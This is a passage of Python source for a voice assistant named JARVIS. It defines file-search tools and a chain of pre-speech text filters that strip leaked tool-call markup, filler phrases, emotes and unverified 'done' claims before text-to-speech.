                    if len(matches) > 100:
                        break
            except OSError:
                continue  # broken symlink / permission — skip, keep scanning
    except Exception as e:
        return f"File listing failed [{type(e).__name__}]. Tell the user briefly."
    truncated = len(matches) > 100
    matches = matches[:100]
    logger.info(
        f"glob_files → pattern={pattern!r} root={root} matched={len(matches)} "
        f"scanned={scanned} truncated={truncated} ceiling={hit_ceiling}"
    )
    head = "\n".join(matches)
    if truncated:
        head += "\n…[more results truncated — narrow the pattern]"
    if hit_ceiling:
        head += f"\n…[stopped after scanning {_SCAN_CEILING} entries — narrow the path]"
    return head or f"No files matching {pattern!r} under {root}. Tell the user the search came up empty."


@function_tool
async def grep_files(pattern: str, path: str = ".", glob: str = "") -> str:
    """Search for a regex `pattern` across files under `path`.

    Use for atomic "where is X used" / "find every TODO" / "which file
    mentions Y" asks. Wraps ripgrep if installed (fast), else grep -R.
    Returns `file:line:match` lines, capped at 50.

    NEVER use this to LIST files (use glob_files) or READ a single
    file (use read_file). Use only when you need to find content
    INSIDE files matching a regex.

    Args:
        pattern: Regex (POSIX ERE / PCRE2 depending on rg vs grep).
        path:    Root to search under (default = cwd).
        glob:    Optional file glob filter, e.g. "*.py".
    """
    pattern = (pattern or "").strip()
    if not pattern:
        return "No search pattern supplied. Ask the user what to look for."
    root = Path(path or ".").expanduser()
    if not root.exists():
        return f"Search root {root} does not exist. Tell the user the directory is missing."
    # Prefer ripgrep — bundled into many distros and into bun's embedded
    # tools. Fast and handles binary-skipping by default.
    has_rg = shutil_which("rg")
    if has_rg:
        argv = ["rg", "--no-heading", "--line-number", "--max-count", "5", "--max-columns", "300"]
        if glob:
            argv += ["-g", glob]
        argv += ["--", pattern, str(root)]
    else:
        argv = ["grep", "-RHn", "--max-count=5"]
        if glob:
            argv += [f"--include={glob}"]
        argv += ["--", pattern, str(root)]
    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.DEVNULL,
        )
        out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
    except asyncio.TimeoutError:
        proc.terminate()
        try:
            await asyncio.wait_for(proc.wait(), timeout=2.0)
        except asyncio.TimeoutError:
            proc.kill()
        return "Search timed out after 30 seconds. Ask the user to narrow the scope (e.g. add a glob filter or smaller path)."
    except Exception as e:
        return f"Search failed [{type(e).__name__}]. Tell the user briefly."
    text = out_b.decode("utf-8", errors="replace").strip().splitlines()
    total = len(text)
    text = text[:50]
    logger.info(f"grep_files → pattern={pattern!r} hits={total}")
    head = "\n".join(text)
    if total > 50:
        head += f"\n…[+{total - 50} more matches]"
    return head or f"No matches for {pattern!r} under {root}. Tell the user briefly and suggest a different keyword."


def shutil_which(name: str) -> str | None:
    """Cheap stdlib `which` (avoids importing shutil at module top to
    keep the import block stable)."""
    import shutil
    return shutil.which(name)


# ── TTS guard: strip function-call leakage ────────────────────────────
#
# llama-3.3-70b on Groq sometimes emits a tool call as raw TEXT in the
# completion stream instead of through the structured tool_call API.
# When that happens, the TTS voices "function run_jarvis_cli request
# Show a 3D view of a human being" which sounds completely broken to
# the user and the actual tool never runs. This filter spots common
# leakage patterns and removes them from the TTS-bound stream while
# leaving normal speech intact.
_LEAK_PATTERNS = [
    re.compile(r"<\s*function[^>]*>.*?</\s*function\s*>", re.DOTALL | re.IGNORECASE),
    re.compile(r"<\s*function_calls\s*>.*?</\s*function_calls\s*>", re.DOTALL | re.IGNORECASE),
    re.compile(r"<\s*invoke[^>]*>.*?</\s*invoke\s*>", re.DOTALL | re.IGNORECASE),
    re.compile(r"<\s*parameter[^>]*>.*?</\s*parameter\s*>", re.DOTALL | re.IGNORECASE),
    re.compile(r"<\|tool_call_(?:start|end|begin|finish)\|>", re.IGNORECASE),
    re.compile(r"\{\s*\"request\"\s*:\s*\"[^\"]*\"\s*\}"),
    re.compile(r"\{\s*\"name\"\s*:\s*\"(?:run_jarvis_cli|type_in_terminal)\"[^}]*\}", re.DOTALL),
]


async def strip_function_call_leakage(text):
    """Drop raw function-call markup from the TTS-bound text stream.

    Buffers ~250 chars at a time so multi-token leakage spanning chunk
    boundaries still gets caught. When the stream ends, any remaining
    buffer is flushed (after one final regex pass).
    """
    buffer = ""
    BUF_KEEP = 250
    async for chunk in text:
        buffer += chunk
        for p in _LEAK_PATTERNS:
            buffer = p.sub("", buffer)
        if len(buffer) > BUF_KEEP:
            yield buffer[:-BUF_KEEP]
            buffer = buffer[-BUF_KEEP:]
    if buffer:
        for p in _LEAK_PATTERNS:
            buffer = p.sub("", buffer)
        yield buffer


# Closer phrases the speech LLM habitually appends. Split into two
# pattern sets so we don't over-strip:
#
#   _HEDGE_RE — pure hedges that are NEVER a legitimate standalone
#     reply. Strip whether they're at start-of-text or appended.
#   _APPEND_RE — terminators that CAN be legitimate standalone replies
#     ("Glad it helped" in response to "thanks", "Done." after a task).
#     Only strip when they trail other content (whitespace boundary,
#     not start-of-text). Single-word reply "Done." stays.
#
# Both are anchored to end-of-stream — applied in strip_voice_closers
# only after the LLM has finished generating, so "Done." mid-answer
# can't trigger.

_HEDGE_RE = re.compile(
    r"(?:^|\s+)("
    r"anything else[^.!?]*?(?:[,.\s]+sir)?|"
    r"how can i help(?:\s+you)?(?:[,.\s]+sir)?|"
    r"what (?:can|would) i (?:do|help)(?:\s+for you|\s+with)?(?:[,.\s]+sir)?|"
    r"what would you like me to do(?:\s+next)?(?:[,.\s]+sir)?|"
    r"let me know if [^.!?]*?(?:[,.\s]+sir)?|"
    r"just let me know(?:[,.\s]+sir)?|"
    r"i[’'`]?m here if you need me(?:[,.\s]+sir)?"
    r")[.!?,]?\s*$",
    re.IGNORECASE,
)

_APPEND_RE = re.compile(
    r"\s+("                                           # whitespace boundary REQUIRED — never matches at start
    r"done|"
    r"glad(?:\s+(?:it helped|to help|i could help))?(?:[,.\s]+sir)?|"
    r"that[’'`]s what i (?:see|saw)(?:[,.\s]+sir)?|"
    r"(?:i[’'`]?m\s+)?happy to help(?:[,.\s]+sir)?"
    r")[.!?,]?\s*$",
    re.IGNORECASE,
)


async def strip_voice_closers(text):
    """Strip trailing hedge-closer phrases the speech LLM appends.

    Runs ONLY on end-of-stream — closers anchored at $ would never match
    mid-stream anyway. Applies repeatedly to peel multiple stacked
    closers ("Done. Anything else you need?" → "").
    """
    buffer = ""
    KEEP_TAIL = 250
    async for chunk in text:
        buffer += chunk
        if len(buffer) > KEEP_TAIL:
            yield buffer[:-KEEP_TAIL]
            buffer = buffer[-KEEP_TAIL:]
    if buffer:
        prev = None
        while buffer != prev:
            prev = buffer
            buffer = _HEDGE_RE.sub("", buffer).rstrip()
            buffer = _APPEND_RE.sub("", buffer).rstrip()
        if buffer:
            yield buffer


# Strip "sir" from voiced replies. gpt-oss-120b appended ", sir" to
# nearly every sentence — heard 2026-04-28 with 21 of 25 last assistant
# replies containing it. The first cure (2026-04-28) was "keep the
# first sir, strip the rest"; the drop-butler-register overhaul
# (2026-05-09) tightened it further: JARVIS's voice no longer uses
# the butler register at all, so this safety net now drops EVERY
# occurrence. Streamed processing — matches are silently dropped
# before TTS sees them, even when the LLM still emits 'sir' from
# learned habit.
# Match the comma+space+sir cluster but leave trailing punctuation
# alone so the host sentence keeps its terminator. Earlier version
# included [,.]? which ate the period and produced run-on output.
_SIR_RE = re.compile(r",?\s*\bsir\b", re.IGNORECASE)

# Trailing-sir matcher: ",?\s*sir\b\s*[.!?]?$" — captures the
# robotic "...everything ends with." cadence that makes JARVIS
# sound like a butler-bot. The whole match (including the trailing
# period/comma) gets dropped, then we re-append the original sentence
# terminator (period/exclamation/question) so the line still ends
# cleanly. Bare-vocative "Yes?" is exempt because it bypasses
# this filter — voiced via session.say() directly, not through the
# tts_text_transforms chain.
_TRAILING_SIR_RE = re.compile(
    r",?\s*\bsir\b\s*([.!?]?)\s*$",
    re.IGNORECASE,
)


# If the ENTIRE reply is a hedge — "Sorry, I missed that...", "I'm
# here to help", "I'm listening, sir", or just "..." — drop it
# wholesale. These fire when STT picks up ambient room conversation
# the user isn't directing at JARVIS; gpt-oss-120b can't tell so it
# replies with a clarification instead of staying silent. Empty TTS
# output = JARVIS stays quiet, which is what we want for ambient.
# Removed 2026-04-30: `_PURE_HEDGE_REPLY_RE` and the `drop_pure_hedge`
# filter that consumed it. Post-LLM hedge filtering kept eating
# legitimate replies (most recently 'I'm here.') because the
# regex couldn't tell a deflection from a valid short answer to
# 'are you there?'. Replaced with `_is_garbage_transcript()` upstream
# in JarvisAgent.on_user_turn_completed — filtering BEFORE the LLM
# call is unambiguous (user transcripts have obvious noise shapes;
# LLM replies are open-ended prose where the same string can be
# valid OR a hedge depending on context).


# Phase-7 TTFW measurement: stamp the moment the first non-empty
# chunk of LLM output reaches the TTS pipeline. The legacy `_on_item`
# metric measured the time the assistant message landed in chat_ctx
# (post whole-LLM-completion); this filter gives a TRUE first-token
# latency since it sits at the head of tts_text_transforms — i.e. the
# moment text starts streaming to TTS, which is what the user
# perceives as "JARVIS started talking".
#
# The session reference is late-bound via _active_session_for_telemetry
# because tts_text_transforms is set at AgentSession construction time
# and the filter list itself can't reach back into the session via
# closure capture. The container is set in entrypoint() right after
# the session is built.
_active_session_for_telemetry: list = [None]


async def stamp_first_token(text):
    """Mark `session._jarvis_first_token_at_monotonic` on the FIRST
    non-empty/non-whitespace chunk of an LLM stream. MUST be the first
    filter in tts_text_transforms so we time pre-filter LLM output
    rather than post-filter; otherwise hedge-drops or preamble-strips
    would mask early tokens that DID reach this pipeline.

    Also logs every chunk verbatim (repr) while debugging the
    no-space-in-TTS issue (2026-05-15). Remove or gate behind env
    var once the root cause is found."""
    first = True
    async for chunk in text:
        if first and chunk and chunk.strip():
            sess = _active_session_for_telemetry[0]
            if sess is not None:
                try:
                    sess._jarvis_first_token_at_monotonic = time.monotonic()
                except Exception:
                    pass
            first = False
        if chunk and os.environ.get("JARVIS_DEBUG_TTS_CHUNKS", "0") == "1":
            logger.info(f"[tts-debug] LLM chunk={chunk!r}")
        yield chunk


# Convert European space-thousands ("4 000", "1 234 567") to comma
# notation ("4,000", "1,234,567"). gpt-oss-120b habitually writes
# numbers with space separators; Groq Orpheus mis-pronounces those
# (heard 2026-04-28: "4 000" voiced as "forty"). Standard "4,000"
# is voiced cleanly as "four thousand".
# Pattern: 1-3 digits, then one+ groups of "<space>3-digits", with
# negative-lookarounds to avoid eating partial digits in IPv4 / dates.
_SPACED_NUMBER_RE = re.compile(r"(?<!\d)(\d{1,3})((?:\s+\d{3})+)(?!\d)")


def _comma_thousands(match: re.Match) -> str:
    return match.group(0).replace(" ", ",")


# Strip chatty progress-narration prefixes that gpt-oss-120b emits
# before the actual answer. Heard 2026-04-28 — "what time is it"
# returned: "Let me try again from scratch. I'll fetch the current
# time in Cameroon. Checking the internet... Okay, I have the
# current time. The current time in Cameroon is twenty-one forty-
# five." That's 15s of speech for a 2s answer. Strip the preambles.
_PREAMBLE_RE = re.compile(
    r"^\s*(?:"
    # "Let me X" — process narration before tool calls
    r"let me (?:try (?:again )?(?:from scratch|once more)?|"
        r"check (?:that|on that|for you|on it)|"
        r"fetch (?:that|the [\w\s]+?)|"
        r"see|look (?:that up|into that)|"
        r"do that (?:for you|now)|"
        r"grab (?:that|the [\w\s]+?))[^.!?]*[.!?]\s*|"
    # "I'll X" — first-person process narration
    r"i[’'`]?ll (?:fetch|check|grab|look|find|get|pull|see|try|do) [^.!?]*[.!?]\s*|"
    # "Checking..." / "Fetching..." — gerund filler with ellipsis
    r"(?:checking|fetching|looking|searching|grabbing|pulling|loading|querying|polling|"
        r"reading|scanning|finding|computing|processing|analyzing)"
        r"[^.!?]*\.{2,}\s*|"
    # "Okay, I X" — post-tool acknowledgment
    r"(?:okay|alright|right|ok),?\s+i (?:have|got|found|fetched|checked|see|see\s+that) [^.!?]*[.!?]\s*|"
    # "Alright, here's the result" — only matches when prefixed by alright/okay/etc.
    r"(?:alright|okay|ok|so),? (?:here[’'`]?s|here is)[^.!?,:]*[,:.!?]\s*|"
    # (Removed bare "here's what i/you ..." catchall — the more specific
    # pattern below handles it without eating the answer past the colon.)
    # "One moment / second"
    r"(?:one|just (?:a|one)|give me (?:a|one)) (?:moment|second|sec|minute)[,.]?\s*(?:please[,.]?)?\s*[.!?]?\s*|"
    # "Sure!" / "Of course!" / "Absolutely!" — sycophantic acknowledgers
    r"(?:sure|of course|absolutely|certainly|definitely|gotcha|got it|on it|will do|copy that)"
        r"[!.,]?\s*(?:thing|sir)?[!.,]?\s*|"
    # "To answer your question" / "As you mentioned" / "Based on..." — re-stating
    # Use [^.!?,]* (excludes commas) so the match ENDS at the comma
    # before the actual answer, not at the answer's terminal period.
    r"(?:to answer your question|as you (?:mentioned|asked|noted)|based on (?:what|your)|"
        r"regarding your (?:question|request))[^.!?,]*[,.!?]\s*|"
    # "Here's what I found: ..." / "Here's what I found, ..."
    # Exclude colon from wildcard so the match stops AT the colon.
    r"here[’'`]?s what (?:i|you) (?:found|got|see|have)[^.!?,:]*[,:.!?]\s*|"
    # "The answer is:" / "Here's the answer:"
    r"(?:the answer is|here[’'`]?s the answer)[:,.]?\s*"
    r")+",
    re.IGNORECASE,
)


async def strip_preambles(text):
    """Strip 'Let me check...', 'Okay I have...', 'Checking the internet...' filler.

    Safety: if the strip would leave the buffer EMPTY (the entire reply was
    classified as preamble), yield the original. The whole reply being a
    preamble means the preamble IS the reply (e.g., a "Reviewing now."
    acknowledgment chunk that arrived alone because the supervisor split
    its response across multiple stream frames or got cancelled mid-flight).
    Silencing it is worse than letting a short status announcement through —
    voice users need to hear SOMETHING."""
    buffer = ""
    async for chunk in text:
        buffer += chunk
    if not buffer:
        return
    cleaned = _PREAMBLE_RE.sub("", buffer).lstrip()
    if not cleaned.strip():
        # Stripping would silence JARVIS entirely — keep the original.
        logger.info(
            f"[preamble-strip] would-have-cut {len(buffer)} chars but that "
            f"would silence the reply; passing through original"
        )
        yield buffer
        return
    if cleaned != buffer:
        logger.info(f"[preamble-strip] cut {len(buffer) - len(cleaned)} chars of filler")
    yield cleaned


# `_META_SILENCE_RE` and `_ARCHAIC_OPENER_RE` were duplicated here
# pre-2026-05-10; the canonical definitions now live in
# pipeline/chat_ctx.py and are imported at the top of this file.
# `strip_archaic_openers` below uses the imported alias.


async def strip_archaic_openers(text):
    """Trim "Indeed.", "Quite.", "Splendid.", "Very well." and
    siblings off the START of a reply. The user has explicitly said
    these sound robotic / archaic. The system prompt forbids them; this
    is a safety net for when the LLM does it anyway.

    Only the LEADING phrase is removed — mid-sentence occurrences are
    preserved (so "the answer is quite simple" is untouched). If the
    archaic phrase IS the entire reply, drop it (treat like meta-silence
    — better an unanswered ping than an annoying one)."""
    buffer = ""
    async for chunk in text:
        buffer += chunk
    if not buffer:
        return
    m = _ARCHAIC_OPENER_RE.match(buffer)
    if not m:
        yield buffer
        return
    rest = buffer[m.end():].lstrip()
    if not rest:
        # Whole reply was just the archaic opener — drop entirely.
        logger.info(f"[archaic-strip] dropped reply: {buffer!r}")
        return
    # Capitalize the now-leading character if it was lowercased.
    rest = rest[0].upper() + rest[1:] if rest else rest
    logger.info(f"[archaic-strip] trimmed {buffer[:m.end()]!r} → reply starts {rest[:40]!r}")
    yield rest


async def strip_meta_silence(text):
    """Drop replies that announce non-response (e.g. "Silence.").

    Saying "Silent" / "Silence" / "Just listening" out loud is the
    same failure as actual chatter for ambient turns. The LLM is told
    not to do this, but reliable behavior requires a safety net here
    too. Only fires when the ENTIRE buffered reply matches — never
    cuts mid-sentence content like "the silence was deafening."
    """
    buffer = ""
    async for chunk in text:
        buffer += chunk
    if not buffer:
        return
    if _META_SILENCE_RE.match(buffer):
        logger.info(f"[meta-silence-strip] dropped reply: {buffer!r}")
        return  # emit nothing — actual silence
    yield buffer


async def normalize_numbers(text):
    """Replace space-thousands ('4 000') with comma-thousands ('4,000')."""
    buffer = ""
    KEEP_TAIL = 20  # max number length we care about
    async for chunk in text:
        buffer += chunk
        if len(buffer) > KEEP_TAIL:
            ready = _SPACED_NUMBER_RE.sub(_comma_thousands, buffer[:-KEEP_TAIL])
            yield ready
            buffer = buffer[-KEEP_TAIL:]
    if buffer:
        yield _SPACED_NUMBER_RE.sub(_comma_thousands, buffer)


async def cap_sir_count(text):
    """Strip every 'sir' from voiced replies — the safety net for the
    drop-butler-register overhaul (2026-05-09). JARVIS's voice no
    longer uses the butler register at all; this filter makes the
    runtime promise hard even when the LLM still emits 'sir' from
    learned habit. Two-pass cleanup:

      1. Strip trailing 'sir' at end-of-reply, preserving the
         original terminator (./!/?). The "Done." / "It's clear."
         cadence is the most overtly robotic shape.
      2. Drop ALL remaining 'sir' occurrences in the body (was:
         keep first only, until 2026-05-09).

    The bare-vocative reply ('Yes?') bypasses this filter entirely
    — it's voiced via session.say() directly, not through the
    tts_text_transforms chain — and no longer contains 'sir' anyway.
    """
    buffer = ""
    async for chunk in text:
        buffer += chunk
    if not buffer:
        return

    # Pass 1 — strip trailing sir, restore terminator.
    m = _TRAILING_SIR_RE.search(buffer)
    if m:
        terminator = m.group(1) or ""
        # Some replies end with the sentence already punctuated
        # (e.g. "Done." → STT inserts a leading "Sir" by accident →
        # we want clean removal). Re-append terminator only if not
        # already present at the cut point.
        cut = buffer[: m.start()].rstrip()
        if terminator and not cut.endswith(terminator):
            buffer = cut + terminator
        else:
            buffer = cut

    if not buffer.strip():
        return

    # Pass 2 — drop ALL remaining 'sir' occurrences in the body.
    out = []
    last = 0
    for m in _SIR_RE.finditer(buffer):
        out.append(buffer[last:m.start()])
        # drop the match (and its surrounding ", " and "[,.]?")
        last = m.end()
    out.append(buffer[last:])
    yield "".join(out)


# Markdown stage-direction emotes — `*(chuckles)*` / `*(soft laugh)` —
# plus stray markdown chars the framework's filter_markdown lets
# through (a bare `*` is not paired emphasis, so it passes untouched).
# Live capture 2026-07-01 20:52 UTC: deepseek-v4-flash prefixed every
# reply with an emote; Kokoro received the segment `*`, pushed zero
# audio frames, the FallbackAdapter marked Kokoro unavailable and
# flipped the voice to EdgeTTS mid-conversation, and only the `*(`
# husk got committed to chat_ctx — which then taught the model to
# emit more emotes (feedback loop).
_EMOTE_PAREN_RE = re.compile(r"\*+\s*\([^)*]*\)?\s*\**")  # *(chuckles)* incl. unclosed "*("
_MD_RESIDUE_RE = re.compile(r"[*_`#~]+")                  # stray markdown chars
_SPEAKABLE_RE = re.compile(r"[^\W_]", re.UNICODE)         # any letter/digit, any script


async def strip_emote_markup(text):
    """Drop stage-direction emotes and guarantee TTS never receives a
    letterless reply.

    Asterisk-wrapped parentheticals are stage directions, not speech —
    removed entirely. Bare emphasis (`*really*`) keeps its word; plain
    parentheticals ("(about sixty)") pass through. If nothing speakable
    remains, emit nothing: a letterless string makes the TTS push zero
    frames, which the FallbackAdapter counts as a provider failure and
    poisons the whole voice chain (voice flip + retry stalls).
    """
    buffer = ""
    async for chunk in text:
        buffer += chunk
    if not buffer:
        return
    cleaned = _EMOTE_PAREN_RE.sub(" ", buffer)
    cleaned = _MD_RESIDUE_RE.sub("", cleaned)
    cleaned = re.sub(r"[ \t]{2,}", " ", cleaned).strip()
    if not _SPEAKABLE_RE.search(cleaned):
        logger.info(f"[emote-strip] dropped unspeakable reply: {buffer[:80]!r}")
        return  # emit nothing — actual silence beats a zero-frame TTS error
    if cleaned != buffer.strip():
        logger.info(f"[emote-strip] stripped emote/markdown markup: {buffer[:80]!r}")
    else:
        # Per-turn pre-TTS text capture (2026-07-01, punctuation-loss
        # investigation): this is the exact text handed downstream to
        # the tokenizer/TTS/transcript. Compare against the committed
        # chat item / conversations.db row to locate text mutations.
        # One INFO line per turn; log rotates daily — cheap to keep.
        logger.info(f"[pre-tts] text: {cleaned[:140]!r}")
    yield cleaned


# Pre-TTS confab gate filter — sits at the HEAD of tts_text_transforms
# (after stamp_first_token, which is at position 0 so TTFW telemetry
# still reflects true LLM first-token time). The filter buffers the
# ENTIRE LLM text stream, inspects it via `should_gate()` using the
# current route + this turn's tool-call list (stashed on the session
# by the function_tools_executed handler), and on trip runs the
# specialty-routes retry ladder via `run_retry_chain()`. The final
# text (retry success or filler) is yielded as a single chunk
# downstream. Gate verdict + retry trace are stashed on the session
# for the end-of-turn telemetry writer to pick up.
#
# Kill switch: JARVIS_PRE_TTS_CONFAB_GATE=0 → no buffering, pass-through.
# Spec: docs/superpowers/specs/2026-05-24-pre-tts-confab-gate-design.md
async def pre_tts_confab_gate_filter(text):
    """Buffer the LLM text stream, run the pre-TTS confab gate, and
    emit either the original text (clean) or a retry-result / filler
    (tripped). Single-chunk emit at end-of-stream — downstream filters
    in tts_text_transforms still run normally on the full buffer.

    Important latency note: buffering shifts TTS start-of-speech from
    LLM-first-token to LLM-last-token. The front-loaded ack
    ("One moment.") fired by `_front_loaded_ack` after 1500 ms is the
    perception cushion (bumped from 800 ms on 2026-05-27 — cached
    Anthropic responses arrive in 700-1000 ms, so 800 ms fired right
    before the real reply and felt robotic). TTFW telemetry stays accurate because
    `stamp_first_token` is at position 0 and stamps BEFORE this filter
    consumes the stream.
    """
    # Kill-switch fast path: no buffering, full pass-through.
    if _pre_tts_gate_disabled():
        sess = _active_session_for_telemetry[0]
        if sess is not None:
            try:
                sess._jarvis_confab_check_state = CONFAB_STATE_BYPASSED_KILLED
                sess._jarvis_confab_pattern_matched = None
                sess._jarvis_confab_retry_models = []
            except Exception:
                pass
        async for chunk in text:
            yield chunk
        return

    # BANTER/EMOTIONAL bypass the gate logic — `should_gate()` returns
    # `bypass_route` for them anyway. Short-circuit at the head so
    # chitchat turns stream unbuffered and TTFW stays at pre-gate
    # latency. Only TASK_*/REASONING pay the buffer cost. Stash the
    # precise telemetry state here so the DB row matches what the gate
    # WOULD have written — `unchecked` would imply the filter never
    # ran, which is misleading when we deliberately short-circuited.
    sess_early = _active_session_for_telemetry[0]
    route_early = getattr(sess_early, "_jarvis_route", None) if sess_early is not None else None
    route_early = route_early or ""
    if route_early in ("BANTER", "EMOTIONAL"):
        if sess_early is not None:
            try:
                sess_early._jarvis_confab_check_state = CONFAB_STATE_CLEAN_BYPASS_ROUTE
                sess_early._jarvis_confab_pattern_matched = None
                sess_early._jarvis_confab_retry_models = []
            except Exception:
                pass
        async for chunk in text:
            yield chunk
        return

    # Buffer the entire LLM stream.
    buffer = ""
    async for chunk in text:
        buffer += chunk

    sess = _active_session_for_telemetry[0]
    if sess is None:
        # No session reference — defensively pass-through.
        if buffer:
            yield buffer
        return

    route = getattr(sess, "_jarvis_route", None) or ""
    tool_calls = list(getattr(sess, "_jarvis_tool_calls_this_turn", None) or [])

    # Check whether tool results have landed in chat_ctx for this turn.
    # Without tool results, the LLM might be voicing "Done!" before the
    # tool actually completed — the user hears the claim before the
    # action finishes. We scan the last 8 chat_ctx items for a
    # FunctionCallOutput or tool_result to confirm the tool finished.
    has_tool_results = False
    if tool_calls:
        try:
            chat_ctx = sess.current_agent.chat_ctx if sess.current_agent else None
            if chat_ctx is not None:
                items = list(getattr(chat_ctx, "items", None) or [])
                # Scan last 8 items for a tool result matching this turn's calls.
                for item in reversed(items[-8:]):
                    # LiveKit FunctionCallOutput type
                    fc_output = getattr(item, "output", None)
                    call_id = getattr(item, "call_id", None)
                    if fc_output is not None and call_id is not None:
                        has_tool_results = True
                        break
                    # Dict fallback (some paths use plain dicts)
                    if isinstance(item, dict):
                        if item.get("output") and item.get("call_id"):
                            has_tool_results = True
                            break
        except Exception:
            pass  # can't check chat_ctx — be permissive

    verdict = _pre_tts_should_gate(
        route=route, text=buffer, tool_calls=tool_calls,
        has_tool_results=has_tool_results,
    )

    if not verdict.should_retry:
        # Clean (or bypass / no-claim / tool-called). Stash telemetry
        # state for the end-of-turn writer; emit the original text.
        try:
            sess._jarvis_confab_check_state = _pre_tts_telemetry_clean(verdict)
            sess._jarvis_confab_pattern_matched = None
            sess._jarvis_confab_retry_models = []
        except Exception:
            pass
        if buffer:
            yield buffer
        return

    # Gate tripped. Run the retry chain.
    logger.warning(
        f"[pre_tts_gate] route={route} TRIPPED pattern={verdict.pattern_matched!r}; "
        f"running retry chain"
    )
    try:
        llm_factory = getattr(sess, "_jarvis_pre_tts_llm_factory", None)
        # chat_ctx lives on `Agent`, NOT on `AgentSession`. Pre-2026-05-27
        # we used `getattr(sess, "chat_ctx", None)` which silently returned
        # None — the retry chain has been non-functional since landing.
        # Reach it via `sess.current_agent.chat_ctx`; defend against the
        # RuntimeError that property raises when no agent is bound.
        try:
            chat_ctx = sess.current_agent.chat_ctx
        except (AttributeError, RuntimeError):
            chat_ctx = None
        tool_specs = list(getattr(sess, "_jarvis_pre_tts_tool_specs", None) or [])
        if llm_factory is None or chat_ctx is None:
            # Factory missing — degrade gracefully: emit the original
            # text but tag the telemetry so we know the gate fired but
            # the retry chain couldn't run.
            logger.warning(
                "[pre_tts_gate] retry chain unavailable (factory or chat_ctx missing) — "
                "emitting original text"
            )
            try:
                sess._jarvis_confab_check_state = CONFAB_STATE_RETRY_FACTORY_MISSING
                sess._jarvis_confab_pattern_matched = verdict.pattern_matched
                sess._jarvis_confab_retry_models = []
            except Exception:
                pass
            if buffer:
                yield buffer
            return
        retry_result = await _pre_tts_run_retry_chain(
            route=route,
            chat_ctx=chat_ctx,
            tool_specs=tool_specs,
            original_text=buffer,
            original_pattern=verdict.pattern_matched,
            llm_factory=llm_factory,
        )
        # Stash retry trace for the end-of-turn telemetry writer.
        try:
            sess._jarvis_confab_check_state = retry_result.telemetry_state
            sess._jarvis_confab_pattern_matched = retry_result.pattern_matched
            sess._jarvis_confab_retry_models = list(retry_result.models_tried)
        except Exception:
            pass
        # Emit the retry result's text — either a clean retry tier or
        # the safe filler.
        if retry_result.text:
            yield retry_result.text
    except Exception as e:
        # Never let the gate block the user-facing path. On unexpected
        # failure, emit the original text and tag telemetry so the
        # operator can debug from the row.
        logger.exception(f"[pre_tts_gate] retry chain raised: {e}; emitting original text")
        try:
            sess._jarvis_confab_check_state = CONFAB_STATE_RETRY_EXCEPTION
            sess._jarvis_confab_pattern_matched = verdict.pattern_matched
            sess._jarvis_confab_retry_models = []
        except Exception:
            pass
        if buffer:
            yield buffer


async def suppress_ambient_backchannel(text):
    """Silence a reply that is NOTHING BUT a filler token ("Right." /
    "Mm." / "Yes?") when the user turn wasn't addressed to JARVIS —
    deterministic enforcement of soul.md's DISCRETION contract (ambient →
    empty string), which non-thinking models drift from (live 2026-07-02:
    the room got a voiced filler on 81% of turns; each one committed to
    chat_ctx taught the next).

    Emitting nothing rides the existing silent-turn path: no TTS, no
    committed assistant text to mimic, no db row. Buffers at most
    _BACKCHANNEL_MAX_LEN chars — anything longer can't be a bare filler
    and streams through untouched. Sits AFTER the confab gate (sees final
    post-retry text) and BEFORE the leakage/emote strippers.
    Kill-switch: JARVIS_BACKCHANNEL_GATE=0."""
    if not BACKCHANNEL_GATE_ON:
        async for chunk in text:
            yield chunk
        return
    buffer = ""
    buffering = True
    async for chunk in text:
        if buffering:
            buffer += chunk
            if len(buffer) > _BACKCHANNEL_MAX_LEN:
                # Too long to be a bare filler — flush, then pass through.
                yield buffer
                buffering = False
        else:
            yield chunk
    if not buffering or not buffer:
        return
    # End-of-stream with a tiny reply: the only candidate shape.
    if _is_bare_filler_reply(buffer):
        sess = _active_session_for_telemetry[0]
        user_text = str(getattr(sess, "_jarvis_last_user_text", "") or "")
        if not _turn_is_addressed(user_text):
            logger.warning(
                f"[backchannel] suppressed filler {buffer!r} on unaddressed "
                f"turn {user_text[:60]!r}"
            )
            return
    yield buffer


async def _post_turn_text_recovery(session) -> None:
    """Belt-and-suspenders recovery: an assistant item landed in chat_ctx
    with no text AND no tool_use, but the turn had fired tool calls
    earlier. The LLM produced no voiced summary. Run the TEXT_FORCE_PROMPT
    retry chain via run_retry_chain(reason_for_retry="no_text_after_tool")
    and voice the result via session.say() — or voice NO_TEXT_FILLER_TEXT
    if the chain exhausts.

    Sets session._jarvis_confab_check_state for end-of-turn telemetry."""
    if getattr(session, "_jarvis_text_recovery_fired", False):
        logger.info("[text-recovery] skipped — flag already set this turn")
        return
    try:
        session._jarvis_text_recovery_fired = True
    except Exception:
        pass
    route = getattr(session, "_jarvis_route", None) or ""
    llm_factory = getattr(session, "_jarvis_pre_tts_llm_factory", None)
    # chat_ctx is on `Agent`, not `AgentSession` — see the matching note
    # in pre_tts_confab_gate_filter above. Same fix here.
    try:
        chat_ctx = session.current_agent.chat_ctx
    except (AttributeError, RuntimeError):
        chat_ctx = None
    tool_specs = list(getattr(session, "_jarvis_pre_tts_tool_specs", None) or [])

    if llm_factory is None or chat_ctx is None:
        # Factory missing — voice the filler directly so the user isn't
        # left with total silence.
        from pipeline.pre_tts_confab_gate import NO_TEXT_FILLER_TEXT
        from pipeline.turn_telemetry import CONFAB_STATE_NO_TEXT_FILLER
        logger.warning(
            "[text-recovery] factory or chat_ctx missing — voicing filler directly"
        )
        try:
            session.say(NO_TEXT_FILLER_TEXT, allow_interruptions=True)
        except Exception as _e:
            logger.debug(f"[text-recovery] say failed: {_e}")
        try:
            session._jarvis_confab_check_state = CONFAB_STATE_NO_TEXT_FILLER
            session._jarvis_confab_pattern_matched = None
            session._jarvis_confab_retry_models = []
        except Exception:
            pass
        return

    logger.warning(
        f"[text-recovery] route={route} silent end-of-turn detected; "
        "running text-force retry chain"
    )
    try:
        result = await _pre_tts_run_retry_chain(
            route=route,
            chat_ctx=chat_ctx,
            tool_specs=tool_specs,
            original_text="",
            original_pattern=None,
            llm_factory=llm_factory,
            reason_for_retry="no_text_after_tool",
        )
    except Exception as e:
        logger.exception(
            f"[text-recovery] retry chain raised: {e}; voicing filler"
        )
        from pipeline.pre_tts_confab_gate import NO_TEXT_FILLER_TEXT
